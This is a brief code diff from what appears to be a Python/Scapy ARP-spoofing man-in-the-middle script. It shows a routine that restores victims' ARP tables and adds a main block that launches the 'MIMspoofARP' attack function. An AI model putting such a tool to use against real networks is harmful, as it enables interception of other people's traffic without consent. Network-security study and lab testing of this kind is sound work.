@@ -48,3 +48,6 @@ def undoARPSpoof(ipVictim, ipServer, macVictim, macServer):
 
     sendp(undoVictim, iface=interface, count=4, verbose=False)
     sendp(undoServer, iface=interface, count=4, verbose=False)
+
+if __name__ == "__main__":
+    MIMspoofARP(ipVictim, ipServer)
